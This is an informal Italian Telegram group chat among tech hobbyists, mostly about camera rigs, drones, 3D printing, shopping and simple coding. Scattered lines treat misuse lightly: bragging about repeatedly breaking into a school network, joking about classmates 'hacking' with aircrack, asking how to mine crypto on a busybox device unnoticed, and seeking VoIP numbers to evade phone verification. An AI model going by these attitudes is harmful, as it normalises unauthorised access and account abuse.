Si, molte volte
Buongiorno a tutti
Non sembra... La anet utilizza un alimentatore da led
Mi sento troppo un Andrea Pagadazi a sborsare 20€ per avere roba gratis 
Sad

Finché paghi meno del valore dei prodotti è apposto ✔
500€ di dazi difficile pagarli 
Per cosa ti serve?
Quello con la carcassa è un alimentatore switching, e va bene se si ha bisogno di correnti elevate anche 30 ampere a 12 v
Cosa ti hanno spedito?
Un caricone di roba da SmallRig
ciao, mi potete aiutare a mettere dslinux sul nintendo ds
???
È la marca dei frame per videocamere?
Ragazzi voi preferite OLED o super amoled??
(per un cellulare)
Dipende
E un brand che produce i rig componibili per reflex e mirrorless
Allora avevo capito bene
Però boh, costano troppo per quel che fanno
E la qualità dove la metti? 
Alla cnc te lo fai del materiale che vuoi e come vuoi  costo minore
Oltre a "proteggere" un po la videocamera e rendere un po' più stabili le riprese non vedo altri utilizzi... Sarebbe bello fare qualcosa di modulare
:Q___
Non sai bene a cosa servono i rig :)
Ik, a cosa servono?
Ecco
Perche più modulare di questo si muore

Parlavo in generale, non di questa marca
Vedrete vedrete, just wait da videoh ☺️
Servono a comporre il corpo, bilanciare il peso, attaccare monitor, microfoni, maniglie...dai un occhio a tutti i vari moduli per della smallrig
Cavolo io devo prenderlo per la mia pana
Dai un'occhiata anche a quelli Neewer e Andoer su Amazon comunque... Più che altro Smallrig costa un rene e tre quarti
Li ho visti e provati....e sono bocciati. Quello che avevo per la Sony invece vale ogni centesimo
Raga raga mi consigliate il mavic pro o il mavic air?
pro
GENTE HO SCOPERTO UNA COSA FIGHISSIMA
Su telegram desktop per rispondere a un messaggio basta un doppio click 
si dal ultimo aggiornamento, è comodissimo
Ah ok allora non ero io che non me ne ero mai accorto 
It's fucking comodo 
Buondì
Ciaoo
Benvenuto !!
Giorno!
 stai arrivando a 2k sul gruppo principale
Eeeh ancora 22
1900 bots wow
Tutti dentro coi voip gente
Mancano 22 eh
*21
Sono un VoIP
Ma nel canale, non qua hahaha
Sorry
Quoto
Ma wtf come hai trovato messaggi di settembre?
allora non hai proprio idea sul loro reale utilizzo
oppure se passi sopra un messaggio, appare la scritta "rispondi" al posto della scritta "admin"
il corpo principale del rig serve a proteggere la fotocamera dai colpi, mentre tutti i buchi servono a montarci adattatori e altri accessori esterni come maniglia superiore, le due maniglie laterali, la guida per il binario, l'asta a giraffa per il microfono, il display esterno, il flash esterno, la batteria supplementare, il braccio snodato per i filtri..si può espandere all'infinito..ovviamente a patto di avere un cavalletto bello pesante
Toto 2-la vendetta di Romboli
ehm... quel messaggio era di settembre  poi quando aveva risolto eliminai i canali
Avevo cercato "
" per vedere se era occupato ed è uscito anche il messaggio
Perché? Ho detto le cose principali
A proteggere e renderla più stabile
Dire stabilità e bilanciare il peso è la stessa cosa
Marco ti posso chiedere una cosa?
L'hai appena fatto
ma il rig serve per montarci le attrezzature esterne, è quello il suo compito principale..sono nati per montarci il microfono con asta a giraffa, il flash esterno e le maniglie
Sai che non ho preso la giraffa alla fine
Ero già 100€ fuori budget 
vabbè il Rode puoi montarlo comunque sullo SmallRig nada problem
Allora 
 posso farti due domande? 
*tre
In tutto questo gli dovrei chiedere se posso inviare il link della mia canzone 
AHAAHAHAHAHAAHAHAHAHAA
Ma non è una domanda questa
Saranno due o tre giorni da quando ho chiesto a te 
Sicuro?
Intanto sto producendo una nuova traccia
Boh io non mi pronuncio, è lui il boss qui dentro
Tranquillo, non è un problema, non ho necessità urgente 
Si dai, ma non più di una
La prima è se può mandare la canzone
E la risposta credo riguardi le canzoni non le domande
Ok, invio il link di YouTube
Si esatto 
Grazie 


Ragazzi ditemi cosa ne pensate, ringrazio Marco per avermi dato il permesso ❤️
questa non la vedo, cosa intendi?

non per sminuire il lavoro ma a me sembra solo velocizzata 
come non detto
ragazzi qualcuno potrebbe spiegarmi l'algoritmo shell sort che su internet non l'ho capito?
^
non avevo sentito il ritornello 
Ah ecco 
AHHAHAHAHHAHAHHAHA 
... 
i voip funzionano su whatsapp?
ho preso un numero con textnow e come codice paese ho messo +1. Whatsapp dice "non è un numero di cellulare valido per il Paese: Canada
AHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHAHHAHAHAHAHAHAHA
Non l’ho capita
in py(per esempio) si possono usare sia i " che i '
per le stringhe
Aaaaah
Pensavo alle derivate io
lol
che spedizione mi consigliate su gb?
urgente veloce grz
nessuna
te la vai a prendere al deposito diretto 
Fai prima
dipende cosa devi prendere
mi band 2 in sconto a 16€
quella gratuita allora..se vuoi aggiungici l'assicurazione a 1 €
Ma sopra a che spesa si rischia la dogana?
l'assicurazione a cosa serve?
è l'altro tipo di spedizione..scegli Registered Air Mail, hai anche il tracciamento
meglio italy express o registered mail?
quale arriva prima?
di solito
sono uguali come tempistiche, la Italy ti costa di più però, e sinceramente per qualche giorno in meno non vale la pena
io uso sempre Unregistered per le cose dai 5€ in giù e la Registered per quelle dai 5€ in su e mi sono sempre trovato benissimo
 che registered usi ? c'è ne sono 3
tra le quali alcune chiedono indirizzo in inglese  ma non ho capito bene
before
after
no
Ripeto, per me è una figata  ma vabbè sei nel gruppo producers quindi 
A me non scarica le immagini I
soluzione: """ 
vabbè hai presente che di fianco al nome abbiamo la scritta "Admin"?
Yup
Se vuoi condividi anche su WhatsApp(con i tuoi amici ecc...) 
ecco, se passo il cursore sopra, quella scritta diventa "Rispondi"
Alternative?
va bene sia la olandese sia quella dell'azerbaijan
Telegram  su Whatsapp non accettano voip
Mi serve whatsapp
oppure '''?
ohmadonna

Figoo
?
No la roba che diceva Filippo
niente messaggi per 2 ore? Cos'avete oggi? 
Da fare
❤️
E io che sto pomeriggio dovevo mettermi su fl e invece mi ritrovo a studiare scienze della terra
._.
quanto ti capisco
Se non fosse che sto ripensando ai laccoliti farei una battuta di merda
ti capisco
cosa copi ou
anzi no, ho deciso, invece che studiare 
, di programmare su processing in p5.js....è tutto il giorno che ci sto dietro, sto facendo cose fighissime
a, l'hai scritto pure te, è vero....beh tu non stai nella nostra classe, non puoi realmente capire la nostra prof
Ragazzi ho un motore elettrico con un perno filettato internamente, come faccio ad attaccarci un mandarino?
Chiedi ad un arancio
A chi?
 mandarino
Arancio - Mandarino 
ti banno un giorno o l'altro, stavo per sputare l'acqua 
Procurata morte
🤦‍♂️🤦‍♂️🤦‍♂️🤦‍♂️
Non so perchè ma il correttore non prende mandrino
non è un correttore cinese
TI giuro ho pensato che fossi tu 
 
Ehi cji è???
uno su javaitalia 
poi però mi sono ricordato che telegram non mostra l'username 
Nooo avevo già swipato per rispondere e fare la stessa battuta hahahah

Buongiorno a tttttuuuuuttttiii
Minghia il fuso orario
Ho visto su thingiverse un modello di robot stampato in 3d (smars) e mi chiedevo se fosse tanto difficile programmare Arduino per questo compito visto che di programmazione conosco solo le basi
Tecnicamente trovi 836 guide online
Volendo
dove posso trovare dei numeri per farmi degli account hotmail?
qualunque servizio provo tipo receive sms online sono tutti già collegati ad altri account
domanda... ma in questo gruppo (rivolto a chi sa programmare) tutti uomini?
Domandina: qualcuno saprebbe indicarmi il dx? Il df(x) è quella linea verticale arancione
MDF confirmed
Ci sta una ragazza xD
Ciao
Niente ho capito
Ahahahahahah
Ho l'interrogazione giovedì
In effetti credo sia la chat con il più basso numero di donne (in proporzione) che conosca: se ho contato bene 3 su 553 
Cavolo
Ci sarà qualcun altra in incognito 
Tipo tu
Ah
wow
Droni facilmente h4k3r4bili
Cosa si può far fare di figo ad un piccolo braccio robotizzato a scopo dimostrativo?
preparare cocktail, scrivere, disenare, costruire cose piu o meno semplici, etc.
Io l'ho scoperto durante l'ora di sistemi
Mentre il prof spiegava tranquillamente come fare le moltiplicazioni e divisioni di due float in C mi parte un "MA CHE CAZZO DI FIGATA" interrompendo la tranquillità della lezione
Addirittura peggio del corso di informatica in uni
ma scappano via con orrore per l'argomento o le dinamiche o proprio 'non pervenute'?
No no proprio non pervenute ahahaha
Abbiamo poco meno del 10% di ragazze in corso
ingegneria ha un paio di ragazze in piu, ma comunque sempre meno di 1/5
Però abbiamo un discreto numero di ragazzi coi capelli lunghi 

Secondo me perché le applicazioni di quello che studiate il non sono quasi mai pensate da donne. Non nel senso di qualche lotta di genere, ma come quando sei piccolo e vai al parco e nessuno ti prende in squadra a giocare a calcio perché pensano tu sia una schiappa. Magari lo sei veramente, ma ci sono anche maschietti che sono pessimi, ma giocando imparano 
ma di persè è questione di gusti, le donne probabilmente preferiscono altro oppure c'è in giro una qualche diceria del cavolo che ad ingegneria/informatica ci sono solo uomini e le donne non sono adatte (fesseria pazzesca tra l'altro)
Sì anche. C'è una certa cultura dell'informatica per uomini (purtroppo ).
Anche se poi in realtà tra le poche ragazze che ci sono alcune sono molto brave.
Ed è chiaramente anche una questione di "gusti"/"pregiudizi"
 


What's New in v0.20.6.896:
• Multi-Account.
• More Themes + Chats Appearance.
• Live Locations + Map View.
• Animated Actions.
• Image Previews in Notifications.
• Emoji Tones + Sticker Suggestions.
• Chat Improvements.
• Unread Badge Counter.
• New Swipe to Reply design.
• For Chat Admins Improvements.
• And more.

What's New in v0.20.6.899
• Fixed app startup when Custom Wallpaper is set.
• Fixed Storage Clear.
• Some minor bugfixes.

Brief overview of new features available on Telegram X for Android.




 
 
 

Siiiiiiiiii 
 
Io non vedo perché passare a telegram X
Perché è più bello esteticamente (secondo me) e soprattutto perché è molto più veloce
Yeeee!
Abbiamo la live location e il multiuser account
Anzi, è meglio di Telegram normale perché ti lascia impostare un tema diverso per ogni account
Però se sei in una situazione favorevole riesci a rifarti con profitti non indifferenti
A me peró deve ancora arrivare l'update...
Eh solo nella beta c'è
Comunque ho scoperto che molti siti riconoscono i VoIP
Non permettendo l'accesso
La trovi qui
Oddio le animazioni nuove 
Thx
Ora partecipo alla beta, ma comunque probabilmente l'attivazione non è istantanea...
 ho messo telegram X
Auguri 
 
Grazie 
 mioh
Qualcuno di voi ha provato?
Ho un digispark con chip attiny85, quindi clone cinese.
Le 5 uscite P0/P4 sono ok.
P5 invece lavora come reset.
Ho trovato info qui: 

Ma non capisco dove inserire il comando :avrdude -P /dev/ttyUSB0 -b 19200 -c avrisp -p attiny85 -
Con cmd mi dice che avrdude non è un operazione valida
ovviamente è per la Shell Linux
Ok, con windows non lavorerà maigrazie
non vedo come possa essere un male
am using linux, if you use windows I would assume this works the same in command prompt, if you enter (replace '/dev/ttyUSB0' with the port your Arduino connects to that you noted earlier):

avrdude.exe -P /dev/ttyUSB0 -b 19200 -c avrisp -p attiny85 -n
Questa e stringa per windows?
no
devi sostituire/dev/ttyUSB0 con la porta di arduino
La COM qualcosa
Buongiorno
Sapreste consigliarmi un buon libro di elettrotecnica?
Augurioo
Àugure 
歡迎
!!!
Con un mavic posso volare in fcc? Posso volare anche in NFZ? Oppure l’applicazione non mi permette di far partire il drone?
ah
vabbè... voleva essere.un auguri
COM port
Loool
raga
come si chiamava l'rx della camera fpv che ha fatto vedere romboli che si collegava via usb?

 ‎€4‎9.‎00‎ i‎nv‎ec‎e ‎ch‎e ‎€7‎9.‎00
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎7.‎97%
⭐️‎ 4‎.3‎0 ‌‎/‌‎ ‎5.‎00‎ (‎41‎ r‎ec‎en‎si‎on‎i)
 

Sono troppo tentato
Cercavo qualcosa di qualità superiore ma quest'offerta...
Vadiii
Non cincischi!!
i7 8700 a 250 euro
Penso sia arrivato il momento di upgradeare il 6600k
Io sono tentato
Ho cambiato idea

Votate votate
Figo ma... Tu pensa a fare il Framework 
Eh dovevo staccare
Sto PC è in grado di far soffrire anche Linux, rip.
Spotto 
 e 
 in mensa 
Che stalker

Dove sei?
Sapete consigliarmi un portafoglio online dove depositare i bitcoin?
Coinbase o Binance
🤔nel senso che il pezzo di perno sporgente è liscio?
Si e ha la filettatura all’interno del perno
beh, se il mandrino che devi montarci ha una filettatura interna, puoi benissimo fare la filettatura esterna al perno usando una filiera..oppure incollarlo con una ottima colla bicomponente per metalli, ma sarebbe meglio la filettatura
Quindi devo trovare un mandrino che abbia lo stesso filetto del perno? Perchè ha un diametro interno di circa 3mm, non credo si trovino mandrini così
Prima chiederei come è spesso quel perno.
A filettarlo anche esternamente che non gli esploda in faccia...
Non ha specificato che motore è se un asincrono, un dc cinese,..
Ac 220 volt di ottima qualità
Montava la ventola per raffreddare degli scambiatori di calore
Ahahahaha è vero

No Mano, stai buona
 e le richieste POST
Intanto ringraziate che non ho ancora fatto domande, se no il ban scattava davvero 
in realtà basta un comando 
Ahahahaha io invece uso ancora le api di telegram
🤔è piccolo come diametro
 Marco manchi soltanto tu :D l'Architetto e Cisolla ci sono :D
Eh appunto, non riesco a trovarlo
non saprei onestamente, dubito ci siano così piccoli..hai provato su qualche sito cinese?
Ciao a tutti qualcuno se ne intende di voli fpv con il drone?
Quello col faretto a chissà quanti metri di distanza è il più intelligento
Si  ma è sicuro farsi un trapano così?
Hai un tornio? 
Puoi fare un adattatore
Purtroppo no
E se avvitassi una vite senza testa e lo fermassi a quella (con i grani in dotazione)?
Forse si
Ma qual è il diametro dell'asse?
Io darei più importanza a quanti giri fa il motore, probabilmente gira troppo forte per bucare metallo, quindi ti conviene ridurre prima velocità con 2 pulegge e poi adattare il mandrino
Perché i giri? Lui vuole solo attaccare il mandrino all'albero
Ok, ma poi non lo usa a bucare?
Se vuole solo attaccarlo va bene
Il dremel ce la fa a bucare il metallo, e gira mooolto veloce
Poi se vuole diminuirli bene, ma bisogna farsi bene i rapporti
Altrimenti peggiori la situazione 
Tutto sta nel capire che utilizzo vuole fare
Andrebbe messo una puleggia piccola al motore ed una grande al mandrino, in modo da aumentare la coppia e diminuire gli rpm
Ma sarebbe meno efficiente in questo modo, secondo me slitta
È un riduttore, l'efficienza e data dall'attrito delle pulegge.
Comunque non slitta, lavatrici e trapani a colonna sono fatti così...
Si ma quelli son fatti apposta
Hanno i tendicosi che la stringono per bene
Non ho gli strumenti e i fondi per fare una cosa del genere
Era per rendere utile quel motore impolverato
Del filetto interno poco più di 3 mm ora non ricordo, 7mm quello esterno (liscio)
Mentre l'adattatore del mandrino quanto è?
Perché se si può allargare il buco di poteva mettere diretto
Ma non hai una grande coppia
3.1mm
Avvito e poi limo l’adattatore..
Diventa troppo fragile allargando il buco, il diametro esterno non è così spesso



 altro che i tuoi indovinelli hahahahaahahha

vai
poi facciamo 50-50

chiedo a voi perchè ne sapete più di me... come si fa a importare in una pagina html del codice (non html) da github
per esempio come nel blog
Gist... Vai su gist, scrivi quel che vuoi e poi incolli lo script che ti dice nella tua pagina
Ok... penso di aver capito
Grazie
Prego figurati
Ragazzi domanda, sto cercando un sito che ho visitato nel browser inapp di Telegram ma non lo trovo più... C'è modo di vedere la cronologia?
Cos? 
Ma vai in mona
Approvo
Sono arrivato a casa adesso da sta mattina
Il doodle non c'è da stamattina 
WOOOOOO
Eh ne avevo compilato un pezzo una volta, ma poi era troppo lungo e ho rimandato🤷‍♂
Qualcuno sa Una stampante 3d molto precisa e veloce? Mi serve da affiancare alla cr10
i3 mega
resina o filamento
anet a8
mi vengono delle stampe ottime
Tra quanto uscirà circa il oneplus 6?
Il 5 era uscito a inizio giugno mi pare
Okay grazie, sono indeciso se prende il 5t o aspettare il 6
Il 6 pare che avrà il notch
Allora aspetto il 6 a sto punto
Ah 
Però poi fa troppo iPhone x
Io lo eviterei proprio per colpa delle corna... Ma si vedrà
Per il 5t sbrigati che pare abbiano fermato la produzione
Sattoh
Ah cavolo
Ma è in vendita ancora eh
Se facessero la fotocamera sotto lo schermo sarebbe il top
Sisi, ho visto
Cos?
Ahahahahaah beh non è totally assurda come cosa
🤔
Eh... Boh tipo lo schermo a cui manca solo un cerchietto per dire invece che tutta la parte
Come si chiama il sito per simulare le ricerche google?
🤔🤔🤔🤔
Usa Photoshop
let me google that for you?
No, quello che ti cerca una cosa poi ti apre il link
Tipo, ma era un sito
Let me duck duck go that for you >>>
Filamento
Hai qualche foto delle stampe?
purtroppo in questo momento no
Mi serve per fare dei box piccoli, ma devono essere così precisi che il foglio di carta si piega xD
anzi l'ho trovata
eccone una
Quanto ci ha messo ha farla?
8 ore perchè è molto spessa
ed è grande anche se non si capisce dalla foto
ho usato pla cctree da gb
Qualche idea del perché la somma verde abbia quella smussatura sulla destra? Sembra tutto simmetrico..
Eh
Sono tre stadi di passabanda con opamp, metti in serie nella forma verde e singoli nelle altre
Trovato, era lmgtfy
EH.... è la sigla di Let Me Google That For You

bello andare nei commenti e vedere Garrixers a caso 
non sono l'unico allora 
Ah scusa 
C'è ancora il referral di bangood di overVolt?
 ho fatto un bell'acquisto di 160€ con il tuo referral su Banggood 
Dimmi solo se ti sono arrivati ahahahahah
Ragazzi è reperibile da qualche parte il video di Maltego?
Sul blog di overVolt
Orca la descrizione 

Sul blog è presente la guida scritta, il video dice che non è disponibile
Ah uh
HAHAHAHAHHAHAHAAHHAHAHA
Un buon Wallet?
Binance o Coinbase
Binance ha più monete
 fortuna che questo problema noi non l'abbiamo avuto, i prof letteralmente sapcciavano le password
Shish
Mi hanno consigliato il Wallet del sito
Già letto
A te?
c'è...c'è....c'è....lui almeno si fa le vacanze lunghe
e adesso sappiamo quale pena potrebbimo scontare noi 
  ma insomma...voglio dire....se possiamo giocare a doom in classe ci lasceranno pure fare ste cagatine
No
Ma AHHAHAHAHAHAHAHAHAHAHAHA
Hahhah link sbagliato o l'hanno segnalato?
Devo controllare ma non mi ricordo le credenziali e sto uscendo, quindi vedremo 
quando neppure a the coding train funziona perchè non ha abbastanza ram nel suo mac demmerd...emmhhh.... per fare un grafico di 
 pixel, ma tu hai 32GiB di ram fierissimi
hehehe
A me sembra ti sia esploso il monitor
e invece...quello è pi mostrato a colori per ogni numero, il primo milioncino :D
Sai a chi inviarla
ci vorrà un po'
When a producer is bored
Ok
15 fottutissimi MiB di PI FOTTUTO GRECO
come ti hanno scoperto?
con cosa stavi facendo hacking?
"hackerare" hanno imparato ad usare aircrack da un paio di giorni?
E poi, farsi sgamare a scuola, che pena
Ma avrà usato un NodeMCU o robe del genere hahaha
No ma io voglio sapere come l'hanno sgamato 
Vi piace la lezione di storia?
l'ha presa da i*******a
non posso dire la parola
"We zio, assemblea di classe" 
perchè mio zio 
 è nel tuo sticker pack?
W il Che
non vale come politico vero?
marco non bannare 
Non ne ho idea
ma come cazzo ha fatto a farsi sgamare.....
Io non capisco il senso di sospendere
be gli è andata bene, voltendo avrebbero potuto denunciarlo, a noi ci hanno sospeso per molto meno
quando stai sul cmd a scrivere "color 0a" e "tree" e a fare i video meme di hacking e girandoti ti vedi la prof chiederti "allora, cosa stai facendo?"
con tutta la calma del mondo a chiederlo proprio
quello di 0a e tree io l'avevo messo nel pc di un laboratorio all'accensione che si avviava in automatico e dopo 2 minuti si spegneva
beh....mi sembra giusto
Looool
È soprattutto come avete fatto a portare le casse a scuola??
Basta metterle nello zaino
È si.... certamente ci stanno
Della scuola
Ma la cosa più impressionante è quel ragazzo sotto le casse che resta impassibile
Avrà respirato almeno una volta?!? È fermissimo
Eravamo anche illegali
Almeno io e due compagni di classe
In quell'ora dovevamo andare in aula magna per sentire la storia della musica ed era obbligatorio
E non ci siamo nascosti nella "discoteca scolastica"
"storia della musica" hahaha, bella questa, mi suicido
Esiste storia della musica
si ma che tristezza
beh...tecnicamente pure voi stavate facendo qualcosa di inerente alla materia, al massimo dite che stavate "discutendo sottovoce" sull'argomento trattato
Oggi con il rappresentante di classe ci siamo incontrati mentre facevamo i nomadi per la scuola e siamo andati nell'atrio dove c'è la porta secondaria dell'aula magna e c'era il rappresentante d'istituto con la ragazza a parlare fra di loro. Il rappresentante d'istituto ha detto che ci faceva rimanere un po' fuori ma poi dovevamo entrare allora dopo un po' il rappresentante di classe è entrato e io me ne son tornato in discoteca


 MITO
mahonna, 
questo mi fa riaffiorare i feels sul passato....del tipo che pure stamattina in classe, mi torna in mente 
 basta, ora maratona notturna di tutta la serie proprio
 
  
 piango, basta 
Ragà un consiglio su come levare kili di polvere dal PC?
aria compressa (ferma le ventole che non girino, pc spento ovviamente)
Compressore
Thanks you guys
Domani sposto tutto sulla nuova scrivania
E ne approfitto
grazie 
 (vedi schermo a destra)
aria compressa e pennello con setole morbide..non usare assolutamente la microfibra
>say Ciao gruppo❤️
Ciao gruppo❤️
beh...io inizierei, non avendo manco la voglia di prendere un fazzoletto di carta, a smontare il pc e poi a mani nude
ooo maaa god
che fierezza
Perchè no microfibra?
Lol
Se i bot sono vietati non è che uno userbot faccia molta eccezione
 mai a mani nude se non sai dove mettere mano..1a regola del riparatore elettronico: sempre guanti in nitrile (no lattice) e pazienza
perchè accumula cariche elettrostatiche
io se non ho il compressore a portata di mano uso sempre pennello e phon con aria fredda
Ok ora lo levo 
Scusa
Ma toccandola non le scarichi?
non sempre..dipende anche se prima scarichi sulla carcassa del case oppure su qualche metallo..anche i pile e le ciabatte sono pericolose
Ah capito
Ma guanti tipo quelli monouso “da pulizie”?
Perdi un sacco di sensibilità per certe cose
Ahahahah
Sei stato tu?
Non se uno Userbot parla come una persona vera 
Sai quante volte sarei dovuto essere stato sospeso allor
Il problema è che Emilio (il tecnico della nostra scuola) ogni volta che fixa una falla ne trovo altre 20 per entrare lo stesso
La compressione di Telegram l'ammazza
da noi il tecnico sa a malapena accendere il computer

cosa è?
Già...del tipo che 1 pixel che vedi sono almeno 4 numeri
L'ho scritto ._. È pi con però al posto dei numeri dei colori
In un grafico 
 del primo milione ci cifre
non si legge niente
no, esistono quelli in cotone e rivestiti di nitrile, fatti apposta per questi lavori
 no Marco fammi capire, l'i9 se l'è fregato Toto?? ma cosa se ne doveva fare scusa, con quella bestia di pc che si ritrovava già? chi cavolo le capisce le politiche di Tom's
Hahaha ma toto ha sempre fatto build per terzi
Quella di oggi è sua tanto quanto lo sono le macchine su cui fa i video 
ah ecco mi sembrava troppo strana come cosa
Cos'è?
Gli istituti tecnici sono i migliori, senza musica di mer
OH MIO DIO
Quando la domenica ti svegliavi alle 7 perché era l'unica ora in cui la rai faceva cartoni decenti
Capisci?
Sarebbe da mandarlo ai miei e sotto a tutto scrivere che è uno scherzo
Io boh queste vacanze maratona pesante
Io queste vacanze recupero i debiti
Oddio
Lol
Tornitura?
Hehehe
Qua faccio venire i feela a chiunque
Come si chiama l'argentatura che sta sulle carte di Yu-Gi-Oh o sui biglietti del cotral?
L'ologramma?
Esatto
A me no 
Eretico
Avete lo schema di qualche amplificatore FM in TX con frequenza variabile?
Per FM  intendi banda 88/108 Mhz?
Si
L'amplificatore di per se non ha una frequenza variabile.
Vengono realizzati con una linea accordata in ingresso e in uscita e calcolata per il centro banda a 98Mhz(quelli allo stato solido) quindi a transistor e mosfet.
Quelli valvolari hanno una linea di accordo variabile in ingresso e a cavità in uscita, anch'essa variabile.
Che caricatore prendo per una batteria lipo per drone 11,1v 3s 4000mha?
Ragazzi, è possibile minare su un dispositivo che utilizza busybox?
Potrebbe andare come mini script watchdog?
Perché questo PC non può andare offline possibilmente
Sono triggerato
 vi ha mai scritto un numero così?🤔🤔
Mi sa di straniero, ma non trovo nulla
È italiano
Eh no, ha un numero in meno🤔
Lol è RGB
Wow quanto costa
Circa 70 euro
È un affare... Quasi quasi... Lo stile è tutto
1 o 2?
Le vere domande della vita
Hyperbeast o M4 skinnato Hyperbeast?
Infatti vanno presi entrambi
Sto spostando la postazione e voglio prendere un bel mousepad
Io uso un tagliere ikea
Lol
Io mi sono innamorato di questo
Aukey XXL
Più o meno la dimensione è quella
90x40
Questo è 80*30
Un po' più piccolo
minchia 70 euro se ne devo prendere uno per ogni cuffia mi van via 500 euro
Vuoi mettere lo stile
ma va molto meglio sul braccio della lampada Ikea da 3 euro
Fedele a ikea ahahah
fai conto io ho questa attaccata al muro con 4 tasselli con tutte le cuffie sopra
900x400 oppure 800x300? tinta unita oppure fantasia?
Una di queste due
800*300
La ho pure io, attaccata alla scrivania, e sono anche riuscito a piegare  il suo gancio di attacco
Guarda che il tagliere Ikea è un upgrade, se devi tagliare una cosa con il taglierino non ti fai problemi
il primo è fantastico 
Lo so
Corrado sei indietro
Tirchiofanboy
 ma con il mouse Ciaomi ci vuole anche il tappetino in alluminio Ciaomi, devi fare il completo
bellissimi, altro che Magic Mouse come ti trovi?
 che combini??
sono gli accessori per la fotocamera
Fino a lì c'ero... Bisogna capire che accessori
Rig, maniglie, asta mic e non mi ricordo cos'altro
C'è il video di sabato per capirlo 
a me sembra un cavalletto
quello è il binario oppure l'asta per il microfono
🤣 PERFIDIA??? Questa non è PERFIDIA!!! QUESTA è Casa Romboli🤣🤣🤣🤣🤣
Lol
Ma cosa
Programmer humor
Si poteva inoltrare
tranqui Lore, sistemato l'ammonizione
Comunque il tuo cane è bellissimo
quella dell'avatar è Riley, l'ha salvata mio papà in campagna quando aveva neanche 2 mesi..l'avevano abbandonata
 questo è il rig SmallRig, ti puoi fare un idea di come verrà più o meno quello di Marco
Figata
La rotella centrale è una diavoleria... Va imparata ad usare,
Nel fisso ogni tanto perde la sincronizzazione e per qualche secondo non funziona... Ma quel fisso a qualche problema ai driver USB e dovrei reinstallarlo...
 Però da portare è comodissimo e te lo dimentichi in borsa
Ma il video ei marco con Daddy qual è
appena lo scontano con quealche coupon lo prendo
A me ne hanno mandati 2 al costo di 1
Cioè gli ho scritto dopo 3 mesi che non era arrivato e me lo hanno rinviato e poi sono arrivati insieme dopo 3 settimane
che culo
invece da banggood ho fatto un ordine da 26€ dopo 2 giorni mi scrivono che un oggetto dell' ordine da 2€ era out of stock e che mi potevano rimborsare quel coso, io accetto e quelli mi rimborsano tutto l'ordine inviando comunque gli altri oggetti che sono già arrivati... bah
meglio così
La testona per il cavalletto è Manfrotto e me la sono pagata
ogni tanto non scrocchi
Due piotte, quella
ma
vanno i comandi con l'hashtag? 
ho scritto 
 e la mano l'ha preso
Io conosco persone che hanno il numero di 9 cifre, perché sono quelli vecchi
Mi sono preso un colpo leggendo la notifica.
sorry hahahahaha ❤️
uuuu lo volevo pure io quello, alla fine però al gamesweek c'era questo della rog e niente :D
scus
pensa quanta Nutella potevi mangiarti
dicevo, 
prova con marco
nope, 
 non si decide a whitelistarlo

Amazon sempre al top, mi ha regalato 5€ per un ritardo di 2 giorni nella spedizione
a me è arrivato uno skateboard per mio fratello che aveva un angolo rotto, ho chiesto il cambio e mi hanno fatto il rimborso totale facendomi tenere lo skate
lo fa sempre anche se prenoti un oggetto e poi quando lo spediscono scende di prezzo, ti rimborsano la differenza, anche se tu paghi ugualmente l'importo scontato..a me per esempio giorni fa hanno rimborsato 7€ sulla collector di Ni No Kuni 2 comprata a mio fratello
Avevo sperimentato l’efficiente sistema di reso gratuito ma mai un ritardo (arriva sempre tutto in tempo)
 pls
Raghi consigli per cable management diy
Non chiedere a 
  che ti travia
Userò quintali di biadesivo
Io ho utilizzato i cosini ikea
Oppure robe del genere
sparachiodi
Oppure le fascette
Brutale
non sui cavi, lo usi per attaccare le fascette o i cosi di velcro
Meno brutale
Lo compro quando vado all'ikea
Che è a un'ora di macchina
Già più ragionevole
devi usarli tutti hahahahh
Bello
con il tubo, il porta fascette e la scatola viene un lavoro pulitissimo e bello...
error 404?
Lo ho detto nell'Audio lol
lo ha proprio detto
ah ok pensavo che si era rincoglionito il bot
lo ho ascoltato solo per quello...
Inviami il link di tutti e due please
Qualcuno è riuscito a cambiare la lingua di Google assistant SDK sul raspberry?? Non trovo l'italiano anche se è stato introdotto l'1 marzo
bellissimo!!
Ragà ma con Google home si posso fare dei comandi custom
Wooo 
com'è?
si anche attraverso ifttt, quelli ufficiali di google si chiamano routine
Bello
bello, a me deve arrivare oggi
ti sto portando sulla retta via
Ti toccherà farti una stampante via ahajaj
lo voglio anche iooo
però vorrei capire se non sono soldi buttati
Si
Spolvero la mia piccolina
Quanto l’hai pagato il compressore?
Non lo so rip
Rip
Ora va
Ah
Ho trovato una soluzione migliore per fortuna
Perfetto
Come faccio in Python a convertire una stringa (un elenco di 4 variabili) nei valori di 4 variabili?
Ad esempio leggo “
” e voglio che in Python a=24 b=373 ecc..
(Per leggere un arduino)
Fika la lampada
.split()
Con la funzione stringa.split però non mi ricordo come funziona
Tipo
I led ? Presi all'ikea
Okay tipo imposto lo split quando trova aaaa e mi separa le variabili
La tua stringa è 

stringa = "13 15 17 20"
 
a, b, c ,d = stringa.split()
print a 

>> 13
Cosi mi pare
No la lampada da scrivania
Ah ma è un microfono
:(((
Si perfetto
stringa.split(" ")
non serve, di default usa già lo spazio
stringa[0] è il primo, stringa [1] è il secondo eccetera
ah non lo sapevo 
Compra un motard
non serve nemmeno quello, c'è l'assegnazione delle variabile da una lista
look on
ah 
Secondo voi ce un modo per collegarla ad un altro computer? E una tastiera senza fili di un vecchio Asus eee top pc all in one. Ma non ce nessuna chiavetta ricevente
forse è blutooth
Apri il pc e cerca il ricevitore
No ho visto su internet che è wireless... dici che ce tipo una chiavetta USB ricevitrice dentro?
 come mai il video di Maltego non è visibile?
Qualcuno è riuscito a cambiare la lingua di Google assistant SDK sul raspberry?? Non trovo l'italiano anche se è stato introdotto l'1 marzo
casini col canale... appena ricarica il video sistemiamo
comunque piuttosto di taggarlo...
...scrivete a me
Overvolt che chiede i nudes
Ciao
Cercavo qualcuno molto bravo a realizzare programmi in c, perché mi serviva un apposito software, se qualcuno è capace e ha tempo a disposizione mi potrebbe contattare? Per il pagamento ci possiamo accordare in privata :)
 almeno la copertina diversa per distinguersi
Sarebbe più cordiale dire qualche specifica in più sul progetto
